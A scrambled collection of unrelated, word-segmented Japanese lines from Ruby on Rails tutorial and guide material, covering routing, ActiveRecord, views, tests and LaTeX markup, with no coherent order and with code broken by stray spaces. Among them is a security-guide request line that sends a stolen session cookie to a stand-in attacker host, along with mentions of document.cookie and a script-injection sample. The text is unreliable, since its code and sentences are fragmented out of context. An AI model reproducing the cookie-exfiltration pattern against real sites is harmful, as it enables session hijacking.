リスト \ ref{ code : following _ followers_ actions _ routes } に よ っ て 生成 さ れ る ルーティング テーブル を 表 \ ref{table : following _ routes } に 示 し ま す 。
タスク は それぞれ 以下 の よう に な り ま す 。
###  パーシャル を 使用 する
` except ` メソッド は 、 引数 で 指定 さ れ た キー が あ れ ば レシーバ の ハッシュ から 取り除 き ま す 。
def edit
基本 的 な 例 を 以下 に いく つ か 示 し ま す 。
{ a :   1 ,  b :   1 } ▖ merge ( a :   0 ,   c :   2 )
続 い て 、 対応 する ` app/views/users /create▖js▖erb ` ビュー ファイル を 作成 し ま す ▟ 実際 の Java Script は この ビュー で 生成 さ れ 、 クライアント に 送信 さ れ て そこ で 実行 さ れ ま す 。
この 章 で 作成 し た デモ アプリケーション に は 良 い ところ も あ り ま す が 、 さまざま な 弱点 も あ り ま す 。
たとえば ` Projects Controller ` を 生成 する と 、 ` app/assets/javascripts/projects▖js▖ coffee ` ファイル と ` app/assets/stylesheets/projects▖css ▖ scss ` ファイル が 新し く 作成 さ れ ま す 。
数値 を 指定 さ れ た 精度 ( ` precision ` ) に 変換 し ま す ▟ デフォルト の 精度 は 3 で す 。
Rails と は 、 Ruby プログラミング 言語 で 書 か れ た Web アプリケーション フレームワーク で す 。
これ に よ り 、 ` Supplier ` モデル の インスタンス で 以下 の メソッド が 使え る よう に な り ま す 。
ユーザー 登録 に 成功 し た 場合 は 、 ページ を 描画 する の で は な く 別 の ページ に \emph { リダイレクト } する よう に し て み ま しょ う 。
外部 データ の エンコード が 不 統一 な 場合 に よく 起き る 症状 と し て は 、 たとえば 画面 に 黒 い 菱型 ◆ と 疑問 符 が 表示 さ れ る と い う もの が あ り ま す 。
これ は 、 HTTP で PATCH 、 PUT 、 DELETE メソッド を 使用 でき る よう に する ミドルウェア で す 。
変更 の 結果 を リスト \ ref{ code :relationship_belongs_to } に 示 し ま す 。
上 の コード に よ っ て 以下 が 生成 さ れ ま す 。
動 か な い 理由 を 確認 し た い 方 は 、 実際 に 実装 し て ページ ネーション の リンク を クリック し て み て くださ い 。
この よう な 危険 が あ る から こそ 、 編集 し て も よ い 属性 だけ を 許可 する よう に 処理 さ れ た パラメータ を 渡 す こと が 重要 に な り ま す 。
しかし 例外 が 重要 な もの で あ る こと も 確か な の で 、 \ ref{ sec : guide_to_further_ resources } で 推薦 し た Ruby 本 で 例外 に つ い て 詳し く 学 ぶ こと を お すすめ し ま す
# logo {  background :  url( <%=   asset_data_uri  ' logo▖ png ' %>)  }
アプリケーション で 使用 する CSS   ( Cascading   Style   Sheet ) 、 Java Script ファイル 、 画像 など の アセット
この ` blorgh ` ディレクトリ に は 、 エンジン で 使用 する その 他 の コントローラ を 置 き ま す 。
  サイン イン 失敗 を テスト でき る よう に し た の で 、 次 は 実際 に ユーザー を サイン イン さ せ ま しょ う 。
       from :  " noreply@ example ▖ com "
まず は 、 埋め込 み Ruby が 使 わ れ て い る \ kode { form\_ for } から \ kode {end } まで の 外側 の 構造 を 読み 解 い て い き ま す 。
これ は 通常 の 動作 で す ▟ " M " と い う モジュール が あ る と する と 、 ` M ` と い う 定数 が 存在 し 、 そこ に モジュール が 保持 さ れ ま す 。
`yield ` を 行な う 領域 を 複数 使用 する レイアウト を 作成 する こと も でき ま す 。
*   独自 の ルーティング 作成 法   ( リソース ベース の ルーティング が 推奨 さ れ ま す が 、 `match ` メソッド に よ る ルーティング も 可能 で す )
どう し て これ で うま く い っ て い る の で しょ う か 。
Turbolinks を 有効 に する に は 、 Turbolinks を Gemfile に 追加 し 、 Coffee Script の マニフェスト   ( 通常 は ` app/assets/javascripts/application ▖js`)   に `//= require turbolinks ` を 追加 し ま す 。
使用 する パーシャル 名 は 、 コレクション 内 の モデル 名 に 基 い て 決定 さ れ ま す 。
         format▖html { ren der   action :  " new "   }
上 の コード で は 、 文字 列 が \ kode { class } メソッド に 応答 し て お り 、 その 文字 列 が 所属 する クラス を 単に 返 し て い る こと が わか り ま す 。
╼       create      app/helpers/users _helper▖ rb
╼╼    \ subsection { Asset   Pipeline } %  ( fold) ╼    \ label{ sec : the_asset_pipeline }╼╼ F
この コード は 、 値 が \ kode {nil } で な けれ ば \ kode {session [ : return_to ] } を 評価 し 、 nil で あ れ ば 与え られ た デフォルト の URL を 使用 し ま す
User オブジェクト は 有効 で は な く な っ た の で 、 データベース に 保存 し よ う と する と 自動 的 に 失敗 する はず で す 。
データベース を 背後 に 持 つ Web アプリケーション を 本番 環境 で 動か し た
つまり 、 以下 の よう に 最小 限 の 情報 で リソース を 一意 に 指定 でき る ルーティング を 作成 する と い う こと で す 。
Last - Modified :   Thu ,   0 8   May  2014   0 1 : 24 : 14   GMT   Content- Type :  text / css
store _location
\ kode {@user } を 保存 し た 後 で は 、 複製 さ れ た ユーザー の メール アドレス が 既に データベース 内 に 存在 する ため 、 ユーザ の 作成 は 無効 に な る はず で す 。
Ruby 自身 の ` Logger ` ロガー および ` Log4 r ` ロガー の どちら と も 互換 性 が あ り ま す 。
ローカル システム また は クラウド IDE で 行 う 次 の 手順 は 、 リスト \ ref{ code :rails_ command } の コマンド を 使用 し た 最初 の アプリケーション の 作成 で す 。
次 に Ruby を インストール し ま す 。
ただし 、 配列 の 中 に ` id ` に 応答 する 項目 が あ る 場合 は 、 `: db ` と い う シンボル を 引数 と し て 渡 す こと で 対応 でき る 点 が 異な り ま す 。
ここ で 、 Rails は その 文字 列 を Location ヘッダ フィールド に 入れ て 302 ( リ ダイレクト ) ステータス を ブラウザ に 送信 し ま す 。
create     test/mailers/previews/user_mailer_preview▖rb
#  `only ` を 使用 する 前 の オリジナル の クエリ
### `belongs_to ` 関連 付け
* `none `
Ruby   gem ごと に バージョン を 明示 的 に 指定 し た \ kode { Gemfile } 。
| Rakefile | この ファイル に は 、 コマンドライン から 実行 でき る タスク を 記述 し ま す 。
     ActionDispatch : : Session▖ const _ get ( store ▖ to_s▖ camelize)   :
継承 の 関係 を { 0 } { 1 } 図 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
新し い セッション の ページ   ( ログ イン )
{ 0 } リスト 2 ▖ 9 { / 0 } ╼╼ { 1 } Microposts コントローラ の 骨格   { 2 } { / 2 }   { 3 } app/controllers/microposts_controller▖ rb { / 3} { / 1 }
    $( " # new_ article " ) ▖ append   xhr ▖ responseText
\ chapter { ユーザー の 更新 ・ 表示 ・ 削除 }  %  ( fold) ╼\ label{ cha : updating _ showing_ and_ deleting _ users }╼╼
` ``html +erb
あ る 環境 に お い て 、 最終 的 な 決定 権 を 持 つ の は アプリケーション 自身 で す 。
上 の コード は 、 ` Product ` モデル を 作成 し 、 データベース の ` products ` テーブル に マッピング さ れ ま す 。
これ を 利用 する こと で ビュー が 改修 し やす く な り 、 コード も 読 み やす く な り ま す 。
INFO :   こう し た メソッド を 実行 する と 、 実際 に 変換 が 行 わ れ た か どう か に かかわ ら ず 、 安全 を 表 す ビット は 常 に オフ に な り ま す 。
ステータス フィード の テスト  
( 上 の コマンド から わか る よう に 、 モデル 名 以外 の 引数 は 不要 で す 。
###  モデル と コントローラ を オーバーライド する
GET   http://www ▖attacker▖ com/_app_session = 836 c 1 c 252 7 8 e 5 b 321 d 6 bea4 f 19cb 57 e 2
       belongs_to   : supplier
ユーザー の index ページ 用 の CSS
自分 が 導入 し た 変更 セット が 含 ま れ て い る こと を 確認 し ま す 。
なお 、 リスト \ ref{ code : following _ tests } で は 、 次 の コード を 加え て い ま す が
これ は リスト \ ref{ code :micropost _model_ image_validation } で 使用 さ れ て い ま し た 。
### `inclusion `
これ を 実現 する に は 、 ` Action Controller : : TestCase # process ` を 以下 の よう に ` test/test _helper▖ rb ` で ラップ し ま す 。
    gem  ' coffee - rails ' ,  '~ >   3 ▖ 2 ▖ 2 '
<% =  ren der   ' form'  %>
これ に よ り 、 [ Follow ]   ボタン が   [ Unfollow ]   に 変わ り 、 Hobbes  の   [ followers ]   カウント が 1人 増え ま す   ( 図 \ ref { fig : page _ flow _other_profile_unfollow_button_mockup } ) 。
Active   Record に お い て 、 オブジェクト と は 永続 的 な データ で あ り 、 その データ に 対 する 振る舞い で も あ り ま す 。
出力 する アクション を 指定 する に は 、 文字 列 の 他 に シンボル を 使用 する こと も でき ま す 。
アプリケーション コード は 既に 実装 済み な の で 、 今回 の 統合 テスト も 含め 、 全て の テスト が   \ passing   に な る はず で す 。
( 以前 同様 、 高速 化 の ため に Rails は データベース の 中 で 合計 を 計算 する よう に し て い ま す ▟ )
これ は 、 最初 の 2 つ の マイ グレーション は この コマンド が 初めて 実行 さ れ た とき に コピー 済み で あ る ため で す 。
####  number_to_percentage
で は ここ で 関数 定義 を click ハンドラ の 外 に 追い出 し 、 Coffee Script で 書き換え て み ま しょ う 。
####  label
これ で 、 Heroku アプリ の アドレス 以外 は 図 \ ref { fig : heroku_app } の とおり に 表示 さ れ る はず で す 。
しかし 既に \ kode {correct _user}   before_filter で \ kode {@user } を 定義 し た の で 、 update アクション と edit アクション から この コード を 削除 でき ま し た 。
上 の 行 で 重要 な 部分 は 実 は CSS コメント の 中 に あ り ま す ▟ 以下 の 行 は 、 適切 な ファイル を インク ルード する ため に Sprockets に よ っ て 使用 さ れ ま す 。
id = \ texttt { 1 } の ユーザー を 更新 する アクション
# => #< Client   id :   221 ,   first _ name :  " Russel " >
( 2 ▖ ▖ 3 ) ▖ include ? ( Math : : E)  # => true
画像 アップロード を テスト する ため の テンプレート
    @ comment▖ destroy
探 し て い る ビュー が そこ に な い 場合 、 続 い て その ディレクトリ を 持 つ すべて の エンジン の ` app/views ` ディレクトリ を 探索 し ま す 。
   class_ name  =  class_ name ▖ singularize  if  collection ?
ところ で 、 サンプル アプリケーション を 既に Heroku 上 に デプロイ し て い る 場合 は 、 \ texttt { heroku run  console } と い う コマンド を 打 つ こと で 、 本番 環境 を 確認 する こと が でき ま す 。
( 図 \ ref { fig : MVC } で は 簡単 の ため ルーター は 省略 し て い ま す が 、 \ ref{ sec : mvc_ in_action } で 詳し く 解説 し ま す ) 。
<em ><b >emph  &amp;  bold</b ></em>
プロフィール ページ に フォロー 用 フォーム と フォロワー の 統計 情報 を 追加 する
有効 化 が 成功 し た 場合 に 表示 さ れ る プロファイル ページ
Bitbucket に toy アプリ の リポジトリ を 作成 する
   def a_method_used _ for_ validation_purposes
従 っ て 、 や む を 得 な い 理由 が な い 限り この オプション は false に し な い で くださ い 。
次 に 、 遠隔 に あ る サーバー の SSL を セットアップ し ま す 。
** ` ActionDispatch : : Cookies` **
class   SandboxEmailInterceptor
これ で 、 本番 環境 用 の Web サーバ の 設定 は 完了 し ま し た ▟ これ ら の 変更 を コミット し 、 デプロイ し て み ま しょ う
` collection▖ clear ` メソッド は 、 コレクション から すべて の オブジェクト を 削除 し ま す 。
有効 化 トークン は 本質 的 に 仮 の もの で な けれ ば な ら な い の で 、 この モデル の \ kode {attr\_accessor } に もう ひと つ 追加 し ま し た 。
作成 し た コード を リスト \ ref{ code : valid _user_test } に 示 し ま す
Article ▖ w here ( 'id   >   10 ') ▖ limit ( 20 ) ▖ order ( 'id   asc') ▖unscope(:order )
`find _each ` で は 、 ` w here ` など の Active   Record メソッド を 連鎖   ( chain )   さ せ る こと で 条件 を 追加 する こと が でき ま す 。
  = >   6
=>   " 1 ,   2 ,   3 ,   4 "
prev_ year   ( last_ year )
     before_ add : [ : check _credit_ limit ,  : calculate _shipping _ charges ]
CSS コード を サニ タイズ し ま す 。
   with _options   if: : is_ admin ?  
NOTE : `: controller ` パス セグメント を 使用 する 場合 、 ` : namespace ` や `: module ` を 併用 する こと は でき ま せ ん 。
` redirect_to ` の 引数 に は どんな 値 も 指定 でき ま す が 、 ` link_to ` や `url_ for ` を 使用 する の が 普通 で す 。
オブジェクト が 存在 する か どう か は 、 `exists ?
データベース に マイクロ ポスト が な い と い う 予想 は 、 以下 の よう に 書 く こと が でき ま す 。
client  =  Client ▖ first
#### ` has_many ` で 追加 さ れ る メソッド
詳細 に つ い て は 、 benchmark/ ips  の   [ README ] (https://github▖ com/evanphx/ benchmark - ips/blob /master / README ▖ md ) を 参照 し て くださ い 。
テスト スイート が 緑色   ( 成功 )   に な る ため に は 、 テキスト ファイル を Ruby コード に マップ する \emph { ステップ } ファイル を 作成 し ま す 。
ユーザー を フォロー する ため の フォーム
どちら の 記法 も よく 使 わ れ て い る の で 、 両方 の 見分け が つ く こと が 重要 で す 。
document▖ cookie プロパティ に は 、 生成 元 web サーバー の cookie が 保存 さ れ て い ま す 。
Rails に は データベース スキーマ を 管理 する ため の ドメイン 固有 言語 ( DSL :   Domain   Specific   Language ) が あ り 、 マイグレーション ( migration ) と 呼 ば れ て い ま す 。
\emph {or  equals } と い う 概念 は 一見 神妙 不可思議 に 見え ま す が 、 他 の もの に なぞらえ て 考え れ ば 難し く あ り ま せ ん 。
   ->   In dex  Scan   u sing   users _pkey   on   users   ( cost = 0 ▖ 0 0 ▖ ▖ 8 ▖ 27   rows = 1  width = 4 )
   belongs_to  : customer ,   class_ name :  " Patron " ,
# => [ [ - 5 ] ,   [ - 3 ,   - 2 ,   - 1 ] ,   [ 1 ,   2 ,   3 ] ,   [ 5 ] ]
この 設定 に する と 、 I 18 n に 渡 さ れ る すべて の ロケール は 、 available_ locales リスト で 宣言 さ れ て い な けれ ば 使用 でき ま せ ん 。
  ( end ) ╼╼    \ subsection { フォロワー } %  ( fold) ╼    \ label{ sec : followers}╼╼
require   : :File ▖ expand _ path ( '▖▖/config/ environment' ,  __ FILE_ _)
* `ActiveSupport: : Deprecation ▖ silence ` は ブロック を 1 つ 引数 に 取 り 、 すべて の 非 推奨 警告 メッセージ を 抑制 し ま す 。
NOTE : ` namespace ` スコープ を 使用 する と 、 ` : module ` や `: path ` プレフィックス に 加え て ` : as ` も 自動 的 に 追加 さ れ ま す 。
<% =  ren der( @products)  ||  " There   are   no  products   available▖ "  
最初 の コード を リスト \ ref{ code :failed_ login_attempt } に 示 し ま す   ( この コード は わざと 少し 間違え て あ り ま す ) 。
    get  ' clashing / : id ' => 'test # example ' ,  as :   : example  
\ kode {edit } アクション と \ kode {update } アクション が 保護 さ れ て い る か どう か テスト する 。
最初 に \ href { http://signup ▖ heroku▖ com/}{ Heroku で ユーザー 登録 } し ま す 。
ウェブ アプリケーション の 文脈 で は 、 \emph { 認証 }   ( authentication )   は サイト の ユーザー を 識別 する こと で あ り 、 \emph { 認可 }   ( authorization )   は その ユーザー が 実行 可能 な 操作 を 管理 する こと で す 。
###  オプション の 展開
Client ▖ order (:created_at )
  >>  Rails ▖env ▖ production ?
生成 さ れ た 名前 が どの よう な もの で あ れ 、 適切 な マイグレーション を 実行 し て 結合 テーブル を 生成 する 必要 が あ り ま す 。
*  `config▖ action_view▖raise _on_mis sing _translations ` は 、 i 18 n で 訳文 が 失 わ れ て い る 場合 に エラー を 発生 さ せ る か どう か を 指定 し ま す 。
\ kode {cookies▖ signed [ :user \ _ id ] } で は 自動 的 に ユーザー ID の cookies の 暗号 が 解除 さ れ 、 元 に 戻 り ま す 。
image_tag ( " rails ▖ png " )  # => < img   src= " http://assets▖ example ▖ com/images/rails ▖ png "   alt = " Rails "  />
これ は リスト \ ref{ code : root _ route } で 使用 さ れ て い ま し た 。
最後 の 作業 で す ▟ この エンジン の ` articles ` リソース は エンジン の ルート   ( root )   パス に 置 く の が ふさわし い で しょ う 。
これ ら を 引き続 き 使用 し た い 場合 は 、 [ Protected   Attributes  gem ] (https://github▖ com/rails/protected_attributes )   を 導入 する こと で スムーズ に アップグレード する こと が でき ま す 。
User モデル に 存在 確認 バリデーション を 追加 する
Connection :  close
最後 に 、 変更 を コミット し ま す 。
続 い て \ kode { FactoryGirl } メソッド を 実行 し ま す 。
d   =  Date▖ current
|   GET        | /photos/:id       | images # show        |  photo _ path(:id )       |
stylesheet_link_tag   " application "  # => < link  href = "/assets/application ▖css "   media = " screen "   rel = " stylesheet "  />
  @ article ▖ destroy
div に 続 い て 、 埋め込 み Ruby コード が 出現 し ま す 。
*  My SQL :   [ EXPLAIN  Output  Format ] ( http://dev▖mysql▖ com/doc/refman / 5 ▖ 6 / en/explain - output▖html )  
COM " ,   " THE _ US - ER@ foo▖ bar▖org " ,   " first ▖ last @ foo▖ jp" ]
    </ul>
その 他 の 情報 源
イン ライン で は 、 デフォルト で ERB を 使用 し て 出力 を 行 い ま す 。
Active   Support は Ruby   on   Rails の コンポーネント で あ り 、 Ruby 言語 の 拡張 、 ユーティリティ 、 その 他 横断 的 な 作業 を 担 っ て い ま す 。
IRC が 初めて で あ れ ば 、 まず   “ irc  client   < あなた の プラットフォーム > ” で 検索 する こと を お 勧め し ま す 。
デフォルト は " ,   " で す 。
実行 結果 を 示 す ため に ` puts ` や ` p ` など の 印字 用 メソッド を 使用 する こと は なるべく 避け る 。
これ に よ り 、 たとえ 他 の エンジン や アプリケーション に article リソース が あ っ て も 衝突 を 回避 でき ま す 。
上 の コード で は 以下 を 使用 し ま し た 。
\ kode { current_user } の コード を 書 く 上 で 、 以下 の 行 に つ い て は 注意 が 必要 で す 。
リスト { p 0 } で モジュール を インク ルード し て い る の で 、 Session コントローラ で { 2 } log _ in { / 2 } メソッド を 使用 でき ま す 。
モデル レベル で の バリデーション は 、 データベース に 依存 せ ず 、 エンド ユーザー が バイパス する こと も でき ず 、 テスト も 保守 も 容易 だ から で す 。
これ は リスト \ ref{ code :micropost _belongs_to_user_ spec } で 使用 さ れ て い ま し た 。
/microposts/ 1/edit
* `initialize_dependency _ mechanism`: `config▖ cache_classes ` が true の 場合 、 ` ActiveSupport: : Dependencies ▖mechanism ` で 依存 性 を ( `load ` で は な く ) ` require ` に 設定 し ま す 。
これ で 、 最初 の 機能 を 備え た エンジン の 生成 に 成功 し ま し た 。
` application/new ` に テンプレート が あ る か どう か を 探 し て い る の は 、 ` Articles Controller ` コントローラ は ` Application Controller ` コントローラ を 継承 し て い る から で す 。
( 第 \ ref { cha : log _ in_log _out } 章 で 本格 的 に 実装 し ま す ) 。
hidden_field(:user ,  : token )
      : premium_videojobs
Form ヘルパー は フォーム 用 の HTML を 生成 し 、 テキスト や パスワード と い っ た 入力 の 種類 に 応 じ た メソッド を 提供 し ま す 。
この 関数 は \emph { ヘルパー } と 呼 ば れ ま す ▟ カスタム ヘルパー を 作成 する 方法 を 学 ぶ ため に 、 まず リスト \ ref{ code :application_layout_redux } の タイトル 行 の 部分 に 注目 し ま しょ う 。
{ 0 } クラス 2 ▖ 15 { / 0 } ╼╼ { 1 } \ kode {Users Controller } クラス に おけ る 継承 { 3 } { / 3 }   { 4 } app/controllers/users_controller▖ rb { / 4 } { / 1 }
| config▖ ru | アプリケーション の 起動 に 必要 と な る 、 Rack ベース の サーバー 用 の Rack 設定 ファイル で す 。
class   Topic  <  ActiveRecord : : Base
レシーバ 自体 の キー に 対 し て 破壊 的 な ブロック 操作 を 適用 する ` transform _keys ! ` メソッド も あ り ま す 。
( 詳細 な 文字 列 を 調べ る ため に { p 0 } で 紹介 し た { 2 } inspect { / 2 } メソッド を 使 っ て い ま す ▟ )
の 基礎 を 学 ぶ こと を 重点 と し 、
class   GuestsCleanupJob  <  ActiveJob : : Base
##### ` collection << (object ,  ▖▖▖)
$ bun dle   exec   rake   test ╼ $  git   push   heroku
----------
従 っ て 、 この 場合 は ` app/views/books/index▖html ▖erb ` ファイル が 出力 さ れ ま す 。
Microposts コントローラ の アクション に 認証 を 追加 する 。
Rails   3 ▖ 0 や Rails   2 ▖ x から の アップグレード の 際 に は 、 いく つ か の 作業 を 行 う 必要 が あ り ま す 。
自分 で わざわざ 作 ら な く て も 、 いつ も 使え る 方法 を ただ 利用 する だけ で は いけ な い の で しょ う か 。
{ 0 } 図 2 ▖ 10 { / 0 } { 1 } ユーザー を 削除 する ▟ \ href { http://railstutorial ▖org / images/figures/demo_ destroy _user_rails _ 3 - full ▖ png } { ( 拡大 ) } { / 1 }
ren der template :  " products/show "
     conflict    config/application ▖ rb
メール アドレス の 小 文字 変換 に 対 する テスト は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : modeling _ users _exercises} ) 。
#     <rank > 2 < / rank>
    boolean ?   ?
##### `find_ in_batches ` の オプション
`blank ? ` メソッド を 使え る よう に する 最も 「 軽量 な 」 方法 は 、 その メソッド が 定義 さ れ て い る ファイル だけ を 選 ん で 読み込 む こと で す 。
= > {: success= > " It   worked ! " ,  error :   " It   failed▖ " }
次 の 章 に 進 む 前 に 、 すべて の 変更 を master ブランチ に マージ し て お き ま しょ う 。
\ kode {user ▖ save } は \ kode {false } を 返 し ま し た ▟ これ は 保存 に 失敗 し た こと を 意味 し ま す 。
def  index
< head >
#     < id type =" integer " > 1903 16 < / id >
Validations   with  # some <tt > : on</tt >
なぜ そんな 面倒 な こと を し な い と いけ な い の で しょ う か 。
皆 さん が 著者 と 同じ 間違い を し て い な けれ ば 、 この テスト は   \ passing   に な る はず で す 。
ユーザー 登録 の 失敗 に 対応 でき る \ kode { create } アクション
global - 908 e 25 f 4 bf 641868 d 868 30 2 2 a 5 b 62 f 54 ▖ css
デフォルト は ` true ` で す 。
以下 の 例 を 見 て み ま しょ う 。
# => { " a " = > 1 }
@account  = @ supplier ▖ create_account ( terms:   " Net   30 " )
d ▖ prev _week              # =>  Mon ,   26   Apr  2010
これ は リスト \ ref{ code : users _migration } で 使用 さ れ て い ま し た 。
タイトル に ERB コード を 使用 し た Home ページ の ビュー
何 やら 目新し い コード が 追加 さ れ て い ま す 。
[ rubyonrails - core メーリング リスト ] ( http://groups▖google▖ com/group/rubyonrails - core/ ) を ご 利用 くださ い 。
データベース 接続 を プール する
1 冊 の 雑誌 に だけ リンク し た い の で あ れ ば 、 以下 の よう に 書 き ま す 。
ユーザー の id 読み出し に は \ kode { params } を 使用 し ま し た 。
/sessions
この とき の レスポンス は 以下 の よう に な り ま す 。
上 の ` update ` アクション で モデル に 対 する ` update ` メソッド の 呼び出し が 失敗 する と 、 同じ コントローラ に 用意 し て お い た 別 の ` edit▖html ▖erb ` テンプレート を 使用 し て 出力 し ま す 。
しかし この メーリング リスト は 、 こう し た アイディア に つ い て 議論 する ため に 用意 さ れ た 場所 で す 。
</aside >
orders▖ size
    xml ▖ h 1 ( @ person ▖ name )
今回 の 目的 は 、 アプリケーション の HTML 構造 を 調べ て 、 レイアウト の 各 リンク が 正し く 動 く か どう か チェック する こと で す ▟ つまり 、
first _ name :  ' does  not  exist '
サーバー を 起動 し ま す 。
ブロック で あ る こと を 示 す に は 波 かっこ   { }  で 囲 み ま す が 、 以下 の よう に do と end で 囲 ん で 示 す こと も でき ま す 。
作成 し た コード を リスト \ ref{ code : users _ resource } に 示 し ま す
また 、 \emph { コード } その もの に も スタイル を 与え ま す ▟ つまり 、 散らか り はじめ た コード レイアウト を \emph { パーシャル } を 使用 し て 整え る と い う こと で す 。
この テスト で は 、 \ kode {reload } メソッド を 使用 し て データベース から 値 を 再度 読み込 み 、 \ kode {assert_equal } メソッド を 使用 し て 同値 で あ る か どう か を テスト し て くださ い 。
`find_or_create_by ` メソッド は 、 指定 さ れ た 属性 を 持 つ レコード が 存在 する か どう か を チェック し ま す 。
パスワード が 空 の まま で も 更新 でき る よう に する  
@ current_user ||=  User ▖find_ by ( id : session [ :user_ id ] )
    <%=  f ▖ label : commenter  %><br>
cookie に 複雑 な オブジェクト を 保存 し な けれ ば な ら な い 場合 は 、 後続 の リクエスト で cookies から 値 を 読み出 す 場合 の 変換 に つ い て は 自分 で 面倒 を 見 る 必要 が あ り ま す 。
sanitize @ article ▖ body ,   tags: % w (table   tr td ) ,   attributes: % w ( id   class style )
1 番 目 の 新し い テスト 例 は 、 単なる 健全 性 チェック で す ▟ これ を 使用 し て 、 まず \ kode {@user } と い う subject が 有効 か どう か を 確認 し ま す 。
Tue ,   31   Aug  2010   23 : 59 : 59   UTC   + 0 0 : 0 0
Regexp ▖ new ('▖') ▖ multiline ?                     
╼╼\ begin { verbatim}╼
development モード の 場合 、 ビュー テンプレート が 変更 さ れ る と ファイル の 日付 で 変更 が 検出 さ れ 、 再度 コンパイル さ れ ま す 。
その ため に は 、 Rails アプリケーション サーバー を 起動 し な く て は な り ま せ ん 。
この 場合 は 以下 の よう に 宣言 し ま す 。
なお 、 この コード で は HTML と ERb が 雑 に 混ざ っ て い ま す ▟ これ を キレイ に 整形 する 課題 は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : signup _exercises} ) 。
### `multiline ?
これ ら の 問い に 答え る ため に は 、 Active   Record を 使 っ て User オブジェクト を 検索 する 方法 に つ い て 学 ぶ 必要 が あ り ま す 。
#   gem  ' guard - rspec ' ,   ' 2 ▖ 5 ▖ 0 '
有効 な メール アドレス を 送信 し た 場合
名前 空間 内 の コントローラ は 以下 の よう に 直接 指定 する こと が でき ま す 。
{ 0 } 図 7 ▖ 10 { / 0 }   { 1 } 現状 の ユーザー 登録 ページ     \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / signup}{/ signup} { / 1 }
これ は リスト \ ref{ code :user_update_action_unsuccessful } で 使用 さ れ て い ま し た 。
                          WHERE   follower_ id   = :user_ id "
##### ` seconds_ since_ mid night`
上 の コード を エンジン 内 で 使用 する と 、 行き先 は * * 常 に * * アプリケーション の ルート に な り ま す 。
` NOT   NULL ` データベース 制約 の あ る 関連 付け で は 、 `:nullify ` オプション を 与え な い よう に する 必要 が あ り ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :user_relationships_association } に 示 し ま す 。
/*╼ * ----------------------------------------------------------------------------╼ * " THE   BEERWARE   LICENSE "   ( Revision   43 ) :╼ *  Michael   Hartl  wrote this   code ▖
     def  products_layout
特定 の 状況 で は 、 この 邪悪 な HTML が 標的 ユーザー の ブラウザ で 表示 さ れ る こと が あ り ま す 。
`scope ` メソッド に は 、 「 浅 い 」 ルーティング を カスタマイズ する ため の オプション が 2 つ あ り ま す 。
最初 に 、 ` public /` ディレクトリ 以下 の ファイル を 新し い 場所 に 移動 し ま す 。
# < contributors type =" array " >
リスト \ ref{ code :micropost _order_test } で は 、 マイクロ ポスト 用 の fixture ファイル から サンプル データ を 読み出 し て い る の で 、 次 の fixture ファイル も 必要 に な り ま す   ( リスト \ ref{ code :micropost _fixtures } ) 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/load _error ▖ rb ` で す 。
上 の コード に よ っ て 以下 の ヘッダー が 生成 さ れ ま す 。
数値 を フォーマット 済み 文字 列 に 変換 する メソッド 群 を 提供 し ま す 。
       create    app/helpers/static _ pages_helper▖ rb
最初 に 、 リスト \ ref{ code :bootstrap_sass } で 示 し て い る よう に Bootstrap を 追加 し ま しょ う ▟ これ は 、 \ texttt { bootstrap - sass }   gem を 使用 し て Rails アプリケーション に 導入 でき ま す 。
表示 さ れ た もの を いろいろ クリック し て み て くださ い 。
*   ビルト イン の Active   Record バリデーション ヘルパー の 使用
関連 付け を 設定 し て い な い 状態 で は 、 モデル の 宣言 は 以下 の よう に な り ま す 。
RedCloth ▖ new ('< script> alert ( 1 ) < / script >', [ :filter_html ] ) ▖ to_html
この モデル に 対 し て クエリ が 実行 さ れ た とき の SQL クエリ は 以下 の よう な 感じ に な り ま す 。
ここ で 行 い た い 選択 は 、 上 より も もう 少し 複雑 で 、 たとえば 以下 の よう な 感じ に な り ま す 。
これ を 実際 に 行 う に は \ kode {cookies } メソッド を 使用 し ま す ▟ この メソッド は 、 \ kode {session } の とき と 同様 に ハッシュ と し て 扱え ま す 。
もし 上 の 例 が 少し 不 自然 に 思え る なら ば 、 勘 が 鋭 い と いえ ま す ▟ と い う の も 、 これ は わざと 不 自然 に 書 い た から で す 。
#   有効 化 し て い な い 状態 で ログ イン し て み る
   scope  : created_before ,  ->(time)  {  w here ( " created_at < ? " , time)   }
    mail ( to :  user ▖email )   do  | format |
これ ら の 統合 テスト を 基本 的 な テスト に 留め 、 網羅 的 な テスト で は あ り ま せ ん 。
`ren der  : text ` を 使用 する と ` text /html ` で 送信 さ れ る ため 、 セキュリティ 上 の リスク が 生じ る 可能 性 が あ り ま す 。
id   1 の ユーザー が id   2 、 7 、 8 、 10 を フォロー し て い る とき の フィード 。
運 悪 く 、 サイン アップ と 編集 フォーム が 古 い バージョン の メッセージ パーシャル を 利用 し て い る ため 、 User の request   spec が 壊れ て しま い ま し た 。
< img   src = 'http://us ▖ i 1 ▖yimg▖ com/us ▖yimg▖ com/i/us/nt/ma/ma_mail _ 1 ▖ gif '
上 の 例 で は 、 `/assets/smile▖ png ` の よう な パス は 返 さ れ ま せ ん   ( 読 み やす く する ため ダイジェスト 文字 は 省略 し て あ り ま す ) 。
アプリケーション の ` config/application ▖rb ` ファイル も 以下 の よう に 更新 する 必要 が あ り ま す 。
この とき 、 Rails は 与え られ た ファイル 名 の 末尾 に   \ kode {_test }   と い う 文字 列 を 追加 する こと に 注目 し て くださ い 。
上 の コード に よ り 、 以下 の よう な ` script ` タグ が 出力 さ れ ま す 。
" " ▖html_safe  +  " < " ▖ html_safe # => " < "
  @book   =  Book ▖find ( params [ : id ] )
追加 タイトル
Rails   4 ▖ 0 で は 複数 の ディレクトリ から の ヘルパー の 読み込 み 順 が 変更 さ れ ま し た 。
= >  Call  with   - d  to   detach
\emph { Ruby   on   Rails   チュートリアル :   実例 を 使 っ て   Rails   を 学 ぼ う }
The  inheritance   hierarchy   for   the  Users  and   Microposts  controllers▖
       create       spec/models/user_ spec ▖ rb
* `: restrict_with _exception ` を 指定 する と 、 関連 付け られ た レコード が あ る 場合 に 例外 が 発生 し ま す 。
|   PATCH / PUT  | / geocoder      |  geocoders # update   |   1 つ しか な い geocoder リソース を 更新 する      |
今度 は ` ENV [ ' DATABASE _ URL '] ` の 接続 情報 は 無視 さ れ ま し た ▟ アダプタ と データベース 名 が 異な り ま す 。
users   =  User ▖ all
